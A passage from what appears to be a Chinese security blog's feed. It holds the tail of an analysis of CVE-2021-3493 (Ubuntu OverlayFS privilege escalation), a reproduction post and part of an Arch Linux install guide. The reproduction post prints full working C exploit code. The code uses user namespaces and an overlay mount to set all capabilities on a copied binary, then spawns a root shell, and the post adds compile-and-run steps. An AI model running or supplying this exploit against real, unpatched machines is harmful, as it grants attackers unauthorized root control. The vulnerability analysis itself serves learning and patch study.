class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, buf);<br><br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;lowerdir=%s,upperdir=%s,workdir=%s&quot;</span>, DIR_LOWER, DIR_UPPER, DIR_WORK);<br>    <span class="hljs-keyword">if</span> (mount(<span class="hljs-string">&quot;overlay&quot;</span>, DIR_MERGE, <span class="hljs-string">&quot;overlay&quot;</span>, <span class="hljs-number">0</span>, buf) == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;mount %s&quot;</span>, DIR_MERGE);<br><br>    <span class="hljs-comment">// all+ep</span><br>    <span class="hljs-type">char</span> cap[] = <span class="hljs-string">&quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;</span>;<br><br>    xcopyfile(<span class="hljs-string">&quot;/proc/self/exe&quot;</span>, BIN_MERGE, <span class="hljs-number">0777</span>);<br>    <span class="hljs-keyword">if</span> (setxattr(BIN_MERGE, <span class="hljs-string">&quot;security.capability&quot;</span>, cap, <span class="hljs-keyword">sizeof</span>(cap) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;setxattr %s&quot;</span>, BIN_MERGE);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;magic&quot;</span>) || (argc &gt; <span class="hljs-number">1</span> &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;shell&quot;</span>))) &#123;<br>        setuid(<span class="hljs-number">0</span>);<br>        setgid(<span class="hljs-number">0</span>);<br>        execl(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;--norc&quot;</span>, <span class="hljs-string">&quot;--noprofile&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;execl /bin/bash&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-type">pid_t</span> child = fork();<br>    <span class="hljs-keyword">if</span> (child == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;fork&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (child == <span class="hljs-number">0</span>) &#123;<br>        _exit(exploit());<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        waitpid(child, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    execl(BIN_UPPER, BIN_UPPER, <span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-literal">NULL</span>);<br>    err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;execl %s&quot;</span>, BIN_UPPER);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>首先看Main函数，该函数fork了子进程并用子进程调用exploit，于是我们跟到exploit函数。</p><center>![exploit分析](https://cdn.starryloki.com/2023/11/79e5888c033c79a0d74db88b176dabc4.png)<br>exploit函数分析</center><p>漏洞利用的要点是：在使用setxattr()设置capability时，参数上是对<code>./ovlcap/merge/magic</code>设置，而实际上是对<code>./ovlcap/upper/magic</code>进行设置，这里出现了一层由overlay“转发”（merge转发到upper）的操作，正是这一层转发操作跳过了cap_convert_nscap中的权限检查，于是可以将文件设置成all+ep的高权限。这里引用一下大佬的权限逃逸过程：</p><center>![权限逃逸过程](https://cdn.starryloki.com/2023/11/3ab120f00faf0fa9819ea890b7ecdae7.png)<br>权限逃逸过程</center>后面我们在回到Main函数，因为已经得到具有高权限的二进制，所以就很容易拿到shell了。<center>![回到Main](https://cdn.starryloki.com/2023/11/c119f53be76c0ba0f20db0dc2dd79120.png)<br>权限提升后的操作</center><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>2021年4月12日的内核补丁对这个漏洞进行了修补，具体实现是每次进入vfs_setxattr函数时，都通过cap_convert_nscap()校验权限，判断capability和user namespace的权限是否匹配，防止出现经过overlay“转发”后权限逃逸的情况。</p><p><img src="https://cdn.starryloki.com/2023/11/5651da01dd43e23f425fa5abd6e253da.png" alt="patch"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是第一次对Linux内核漏洞进行分析，几乎都是看着大佬的文章一步一步跟着走的，也发现了自己的知识面有许多不足，受限于知识水平也无法从内存以及函数调用链分析，只能从表层函数简单地分析原理。</p><p>经过这一次的漏洞分析，我对Linux的权限管理，文件系统等方面有了更加深刻的认识，后续有能力了再进行函数调用链以及内存分析…..</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.anquanke.com/post/id/240030">CVE-2021-3493 Ubuntu内核OverlayFS权限逃逸漏洞分析</a><br><a href="https://blog.csdn.net/qq_15770331/article/details/96699386">深入理解overlayfs（一）：初识</a><br><a href="https://www.cnblogs.com/dream397/p/13996275.html">创建 user namespace</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu内核提权漏洞复现(CVE-2021-3493)</title>
      <link href="/2021/05/27/Ubuntu%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2021-3493/"/>
      <url>/2021/05/27/Ubuntu%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2021-3493/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>OverlayFS 是一种叠合式文件系统，能够在底层文件系统上叠加另一个文件系统，Linux 内核中 overlayfs 文件系统是 Ubuntu 的特定问题，由于没有正确的验证文件系统功能在用户名称空间中的应用，从而导致攻击者可以安装一个允许未授权挂载的 overlayfs 修补程序来提升权限</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Ubuntu 20.10</p><p>Ubuntu 20.04 LTS</p><p>Ubuntu 18.04 LTS</p><p>Ubuntu 16.04 LTS</p><p>Ubuntu 14.04 ESM</p><p>Linux Kernel &lt;  5.11</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs link">http://old-releases.ubuntu.com/releases/20.04.1/ubuntu-20.04.1-desktop-amd64.iso<br></code></pre></td></tr></table></figure><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="检查内核版本"><a href="#检查内核版本" class="headerlink" title="检查内核版本"></a>检查内核版本</h3><p>内核版本需要小于5.11</p><p><img src="https://cdn.starryloki.com/2023/11/322639fa58874ce80032aa857b1bab91.png" alt="check"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><br><span class="hljs-comment">//#include &lt;attr/xattr.h&gt;</span><br><span class="hljs-comment">//#include &lt;sys/xattr.h&gt;</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">setxattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *value, <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flags)</span>;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DIR_BASE    <span class="hljs-string">&quot;./ovlcap&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DIR_WORK    DIR_BASE <span class="hljs-string">&quot;/work&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DIR_LOWER   DIR_BASE <span class="hljs-string">&quot;/lower&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DIR_UPPER   DIR_BASE <span class="hljs-string">&quot;/upper&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DIR_MERGE   DIR_BASE <span class="hljs-string">&quot;/merge&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIN_MERGE   DIR_MERGE <span class="hljs-string">&quot;/magic&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIN_UPPER   DIR_UPPER <span class="hljs-string">&quot;/magic&quot;</span></span><br><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">xmkdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">mode_t</span> mode)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (mkdir(path, mode) == <span class="hljs-number">-1</span> &amp;&amp; errno != EEXIST)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;mkdir %s&quot;</span>, path);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">xwritefile</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd = open(path, O_WRONLY);<br>    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;open %s&quot;</span>, path);<br>    <span class="hljs-type">ssize_t</span> len = (<span class="hljs-type">ssize_t</span>) <span class="hljs-built_in">strlen</span>(data);<br>    <span class="hljs-keyword">if</span> (write(fd, data, len) != len)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;write %s&quot;</span>, path);<br>    close(fd);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">xcopyfile</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *src, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *dst, <span class="hljs-type">mode_t</span> mode)</span><br>&#123;<br>    <span class="hljs-type">int</span> fi, fo;<br><br>    <span class="hljs-keyword">if</span> ((fi = open(src, O_RDONLY)) == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;open %s&quot;</span>, src);<br>    <span class="hljs-keyword">if</span> ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;open %s&quot;</span>, dst);<br><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">4096</span>];<br>    <span class="hljs-type">ssize_t</span> rd, wr;<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        rd = read(fi, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-keyword">if</span> (rd == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rd == <span class="hljs-number">-1</span>) &#123;<br>            <span class="hljs-keyword">if</span> (errno == EINTR)<br>                <span class="hljs-keyword">continue</span>;<br>            err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;read %s&quot;</span>, src);<br>        &#125;<br><br>        <span class="hljs-type">char</span> *p = buf;<br>        <span class="hljs-keyword">while</span> (rd &gt; <span class="hljs-number">0</span>) &#123;<br>            wr = write(fo, p, rd);<br>            <span class="hljs-keyword">if</span> (wr == <span class="hljs-number">-1</span>) &#123;<br>                <span class="hljs-keyword">if</span> (errno == EINTR)<br>                    <span class="hljs-keyword">continue</span>;<br>                err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;write %s&quot;</span>, dst);<br>            &#125;<br>            p += wr;<br>            rd -= wr;<br>        &#125;<br>    &#125;<br><br>    close(fi);<br>    close(fo);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">exploit</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">4096</span>];<br><br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;rm -rf &#x27;%s/&#x27;&quot;</span>, DIR_BASE);<br>    system(buf);<br><br>    xmkdir(DIR_BASE, <span class="hljs-number">0777</span>);<br>    xmkdir(DIR_WORK,  <span class="hljs-number">0777</span>);<br>    xmkdir(DIR_LOWER, <span class="hljs-number">0777</span>);<br>    xmkdir(DIR_UPPER, <span class="hljs-number">0777</span>);<br>    xmkdir(DIR_MERGE, <span class="hljs-number">0777</span>);<br><br>    <span class="hljs-type">uid_t</span> uid = getuid();<br>    <span class="hljs-type">gid_t</span> gid = getgid();<br><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;unshare&quot;</span>);<br><br>    xwritefile(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, <span class="hljs-string">&quot;deny&quot;</span>);<br><br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;0 %d 1&quot;</span>, uid);<br>    xwritefile(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, buf);<br><br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;0 %d 1&quot;</span>, gid);<br>    xwritefile(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, buf);<br><br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;lowerdir=%s,upperdir=%s,workdir=%s&quot;</span>, DIR_LOWER, DIR_UPPER, DIR_WORK);<br>    <span class="hljs-keyword">if</span> (mount(<span class="hljs-string">&quot;overlay&quot;</span>, DIR_MERGE, <span class="hljs-string">&quot;overlay&quot;</span>, <span class="hljs-number">0</span>, buf) == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;mount %s&quot;</span>, DIR_MERGE);<br><br>    <span class="hljs-comment">// all+ep</span><br>    <span class="hljs-type">char</span> cap[] = <span class="hljs-string">&quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;</span>;<br><br>    xcopyfile(<span class="hljs-string">&quot;/proc/self/exe&quot;</span>, BIN_MERGE, <span class="hljs-number">0777</span>);<br>    <span class="hljs-keyword">if</span> (setxattr(BIN_MERGE, <span class="hljs-string">&quot;security.capability&quot;</span>, cap, <span class="hljs-keyword">sizeof</span>(cap) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;setxattr %s&quot;</span>, BIN_MERGE);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;magic&quot;</span>) || (argc &gt; <span class="hljs-number">1</span> &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;shell&quot;</span>))) &#123;<br>        setuid(<span class="hljs-number">0</span>);<br>        setgid(<span class="hljs-number">0</span>);<br>        execl(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;--norc&quot;</span>, <span class="hljs-string">&quot;--noprofile&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;execl /bin/bash&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-type">pid_t</span> child = fork();<br>    <span class="hljs-keyword">if</span> (child == <span class="hljs-number">-1</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;fork&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (child == <span class="hljs-number">0</span>) &#123;<br>        _exit(exploit());<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        waitpid(child, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    execl(BIN_UPPER, BIN_UPPER, <span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-literal">NULL</span>);<br>    err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;execl %s&quot;</span>, BIN_UPPER);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>把源码放入Ubuntu后，使用gcc编译得到二进制文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc exploit.c -o exploit<br></code></pre></td></tr></table></figure><p>添加执行权限：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x exploit<br></code></pre></td></tr></table></figure><p>执行文件提权：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./exploit<br></code></pre></td></tr></table></figure><p><img src="https://cdn.starryloki.com/2023/11/4b7d9b94a6b0b443cb6da4134ae9a3e8.png" alt="pic"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arch Linux安装笔记</title>
      <link href="/2021/05/18/Arch-Linux%E5%AE%89%E8%A3%85%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/05/18/Arch-Linux%E5%AE%89%E8%A3%85%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然macOS属于类Unix系统，但是有许多操作还是要在Linux上操作，比如编译Linux或着运行一些没有移植到macOS的应用，于是就产生了安装一个Linux系统的需求，而如果安装macOS+Linux多系统的话，驱动和切换系统都比较麻烦，所以我选择安装一个Linux的虚拟机。</p><h2 id="发行版选择"><a href="#发行版选择" class="headerlink" title="发行版选择"></a>发行版选择</h2><p>这一次安装我打算安装Arch Linux，这个发行版拥有极为强大的包管理器、拥有详细的Wiki以及强大的社区支持，同时具有可高度定制安装的特点，是一个非常适合开发者的发行版。至于为什么不用Ubuntu或者CentOS呢？<del>想换个口味</del> 这些发行版并不具有以上特性。</p><center><p><img src="https://cdn.starryloki.com/2023/11/ca423b812b4dd57eec5d01eaa2e26afc.jpg" alt="DOGE"></p></center><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><p>平台：macOS 11.3.1 x86_64 with VMWare Fusion 12.1.1<br>系统：Arch Linux 2021.04.01 x86_64</p><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p>Arch Linux不同于其他发行版，前者并没有提供图形或类图形化的安装界面，需要使用命令进行安装。</p><h3 id="新建虚拟机"><a href="#新建虚拟机" class="headerlink" title="新建虚拟机"></a>新建虚拟机</h3><p>VMWare新建虚拟机时可以选择 <code>Other Linux 5.x and later kernel 64-bit</code> 并在启动方式选择UEFI模式启动</p><center><p><img src="https://cdn.starryloki.com/2023/11/5c0b2b631926f6ee9e6069896c30e72d.png" alt="Choose"></p></center><center><p><img src="https://cdn.starryloki.com/2023/11/23f2b049f970129cbc098f60577f855b.png" alt="Choose"></p></center><p>之后将CD&#x2F;ROM指向的光驱文件指向ArchLinux的安装镜像即可</p><h3 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h3><p>指定镜像分配资源之后就能启动虚拟机开始安装了  </p><p>启动虚拟机之后就可以进入Arch的live系统，live系统是一个不包含图形界面的系统，我们需要在上面用命令完成安装的每一个步骤：分区，安装内核，配置系统。  </p><center>![enter](https://cdn.starryloki.com/2023/11/487a6d090b4d8440a994dc207e81b9b4.png)</br>安装界面</center><p>进入live系统之后首先需要查看当前启动方式是否为UEFI：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /sys/firmware/efi/efivars<br></code></pre></td></tr></table></figure><p>如果没有异常地显示了目录则是以UEFI模式启动，之后就可以配置时间：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">timedatectl set-ntp <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>设置成功后就可以进行分区操作，首先列出当前的磁盘：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fdisk -l<br></code></pre></td></tr></table></figure><center><p><img src="https://cdn.starryloki.com/2023/11/79274c7054d059e67591252fba424971.png" alt="Choose"></p></center><p>得到我们的主硬盘是sda，之后可以使用cfdisk进行分区：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">cfdisk /dev/sda<br></code></pre></td></tr></table></figure><p>进入cfdisk后选择GPT，由于我们使用的是UEFI分区，所以需要创建一个至少为260MB的UEFI分区，然后剩下的空间分成Linux Filesystem，注意，如果分配给虚拟机的内存较小就还需要额外分出一个分区作为swap。</p><p>分区完成后就能进行格式化分区并挂载</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mkfs.ext4 /dev/sda1 <span class="hljs-comment">#这是根目录分区</span><br>mkswap /dev/sdax <span class="hljs-comment">#这是交换分区（如果存在）</span><br>mkfs.vfat /dev/sda0 <span class="hljs-comment">#这是UEFI分区</span><br>mount /dev/sda1 /mnt <span class="hljs-comment">#挂载根目录分区</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/boot/EFI <span class="hljs-comment">#创建UEFI目录</span><br>mount /dev/sda0 /mnt/boot/EFI <span class="hljs-comment">#挂载UEFI分区到目录</span><br></code></pre></td></tr></table></figure><p>挂载分区完成后，我们就可以将系统安装到目录下了，在安装之前，可以先指定国内源提高下载速度：</p><p>将  </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Server = http://mirror.bit.edu.cn/archlinux/$repo/os/$arch    <br>Server = http://mirrors.aliyun.com/archlinux/$repo/os/$arch<br></code></pre></td></tr></table></figure><p>添加到 <code>/etc/pacman.d/mirrorlist</code>文件的第一行，然后进行安装：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pacstrap /mnt base linux linux-firmware<br></code></pre></td></tr></table></figure><p>之后就可以耐心等待安装完成（取决于网速）</p><center>![enter](https://cdn.starryloki.com/2023/11/80fb69a2d5afb6bf619e0ae36d5370d0.png)</br>安装完成</center><p>安装完成后需要生成fstab文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab<br></code></pre></td></tr></table></figure><p>生成fstab文件之后就能直接进入安装好系统的Shell了：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">arch-chroot /mnt<br></code></pre></td></tr></table></figure><center>![chroot](https://cdn.starryloki.com/2023/11/434f2b4e20a4a6996bc642b84445d017.png)</br>安装完成</center><p>安装完成后，就要开始进行一系列配置了。</p><p>首先设置时区：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hwclock --systohc<br></code></pre></td></tr></table></figure><p>安装vim，dhcp客户端，sudo：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pacman -S vim dhcpcd sudo<br></code></pre></td></tr></table></figure><p>创建host文件：  </p><p>myhostname为自己想设置的主机名</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;myhostname&quot;</span> &gt;&gt; /etc/hostname<br></code></pre></td></tr></table></figure><p>添加hosts：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">vim /etc/hosts<br></code></pre></td></tr></table></figure><p>在里面输入：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">127.0.0.1   localhost<br>::1     localhost<br>127.0.1.1   myhostname.localdomain  myhostname<br></code></pre></td></tr></table></figure><p>注意myhostname是刚刚设置的主机名</p><p>然后修改root用户密码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">passwd root<br></code></pre></td></tr></table></figure><p>设置sudo：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">vim /etc/sudoers<br></code></pre></td></tr></table></figure><p>把 %wheel 那行前面的#去掉</p><p>新建用户：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">useradd -m -g wheel 用户名 &amp;&amp; passwd 用户名<br></code></pre></td></tr></table></figure><p>设置grub：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pacman -S grub efibootmgr dosfstools ntfs-3g os-prober<br>grub-install --target=x86_64-efi --efi-directory=/boot/EFI --bootloader-id=ArchLinux<br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure><p>设置完成后即可退出并重启：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exit</span><br>umount -R /mnt<br>reboot<br></code></pre></td></tr></table></figure><p>于是系统安装完毕。</p><h2 id="系统后期配置"><a href="#系统后期配置" class="headerlink" title="系统后期配置"></a>系统后期配置</h2><h3 id="安装必要驱动"><a href="#安装必要驱动" class="headerlink" title="安装必要驱动"></a>安装必要驱动</h3><p>首先我们需要安装vmwaretool以及vm的显卡驱动。</p><p>安装vmwaretools和gtkmm：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pacman -S open-vm-tools gtkmm<br></code></pre></td></tr></table></figure><p>配置服务：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/version &gt; /etc/arch-release<br>systemctl start vmtoolsd<br>systemctl <span class="hljs-built_in">enable</span> vmtoolsd<br></code></pre></td></tr></table></figure><p>安装vm显卡驱动：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pacman -S extra/xf86-video-vmware<br></code></pre></td></tr></table></figure><h3 id="安装KDE图形界面"><a href="#安装KDE图形界面" class="headerlink" title="安装KDE图形界面"></a>安装KDE图形界面</h3><p>(需要在非root下操作)</p><p>首先需要设置软件源：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo vim /etc/pacman.d/mirrorlist<br></code></pre></td></tr></table></figure><p>把国内的速度快的源放在第一行</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo vim /etc/pacman.conf<br></code></pre></td></tr></table></figure><p>把multilib和它下面一行的 # 去掉，具体是把光标移到 # 那，按 x ，然后在文件里添加 archlinuxcn 源，按 i 输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[archlinuxcn]<br>Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="hljs-variable">$arch</span><br></code></pre></td></tr></table></figure><p>然后进行更新：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo pacman -Syu<br></code></pre></td></tr></table></figure><p>生成keyring：</p><figure 